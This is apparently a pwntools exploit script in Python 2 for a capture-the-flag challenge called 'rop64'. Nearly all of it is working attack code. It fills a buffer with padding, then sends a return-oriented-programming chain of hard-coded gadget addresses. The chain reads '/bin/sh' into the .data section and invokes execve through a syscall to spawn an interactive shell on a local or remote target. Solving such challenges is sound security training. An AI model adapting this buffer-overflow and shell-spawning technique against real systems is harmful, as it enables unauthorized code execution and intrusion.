#!/usr/bin/env python2

import argparse
import pwn

from pwnlib.util.misc import run_in_new_terminal

# ====================================================================
#                      CONFIGURATION PARAMETERS
# These are to be adjusted to fit the challenge:
#   binary : path to a sample of the challenge binary
#   libc   : path to the libc the program uses (if known)
#   host   : hostname where the challenge is running
#   port   : port where the challenge is listenting
# ====================================================================

binary = '/problems/rop64_1_3a135066aff0c433faf93765baaa584d/vuln'
libc = None
host = None
port = None

# ====================================================================
#   GLOBALS
# ====================================================================

T     = None      # The Target
LIBC  = None      # Libc ELF
BIN   = None      # Target binary ELF

# ====================================================================
#   CLASSES AND FUNCTIONS
# ====================================================================

class Target:
    '''
    Code that interacts with the challenge.
    '''

    def __init__(self, remote, binary=None, libc=None, host=None, port=None, *a, **kw):
        if not remote:    # Local binary
            self.tube = pwn.process(binary, *a, **kw) if libc is None else \
                    pwn.process(binary, env={'LD_PRELOAD': libc}, *a, **kw)
        else:             # Remote challenge
            self.tube = pwn.remote(host, port)

    def __getattr__(self, attr):
        ''' Catch references to pwn.tube methods such as recvuntil, etc '''
        return self.tube.__getattribute__(attr)

    def attach(self):
        ''' Attach to the running process in a radare2 session '''
        if isinstance(self.tube, pwn.process):  # Only attach if we are running a binary
            run_in_new_terminal('r2 -AAA -d %d' % self.tube.pid)
            raw_input('PAUSED [PRESS ENTER TO CONTINUE]')

    # ================================================================
    #   CUSTOM ACTIONS: For easy interaction with the challenge
    # ================================================================


def parse_args():
    ''' Parse program arguments '''
    global port
    parser = argparse.ArgumentParser(usage='%(prog)s [OPTIONS]')
    parser.add_argument('-r', '--remote', help='Attack to the remote target', action='store_true')
    parser.add_argument('-p', '--port', help='Remote target port', nargs='?', type=int, default=port)
    return parser.parse_args()

# ====================================================================
#   MAIN -- FLOW OF THE PROGRAM
# ====================================================================

if __name__ == '__main__':

    # ================================================================
    #   INITIALIZATION
    # ================================================================

    args = parse_args()
    if libc is not None:
        LIBC = pwn.ELF(libc, checksec=False)
    if binary is not None:
        BIN = pwn.ELF(binary, checksec=False)

    T = Target(args.remote, binary, libc, host, args.port)

    # ===============================================================
    #   EXPLOIT STARTS HERE
    # ===============================================================

    # Gadgets
    SYSCALL = 0x449135  # syscall; ret
    POP_RDI = 0x400686  # pop rdi; ret
    POP_RSI = 0x4100d3  # pop rsi; ret
    POP_RDX = 0x4499b5  # pop rdx; ret
    POP_RAX = 0x4156f4  # pop rax; ret

    # .data section address
    DATA_SECTION = 0x6b90e0

    build_rop = lambda gadgets: ''.join(map(pwn.p64, gadgets))

    rop_chain = 'A' * 0x18
    rop_chain += build_rop([POP_RDI, DATA_SECTION, BIN.sym['gets']])                              # read /bin/sh into .data
    rop_chain += build_rop([POP_RAX, 59, POP_RDI, DATA_SECTION, POP_RSI, 0, POP_RDX, 0, SYSCALL]) # execve("/bin/sh", 0, 0)

    T.sendlineafter('Can you ROP your way out of this?', rop_chain)
    # The challenge is expecting us to write something into .data
    T.sendline('/bin/sh')

    T.interactive()

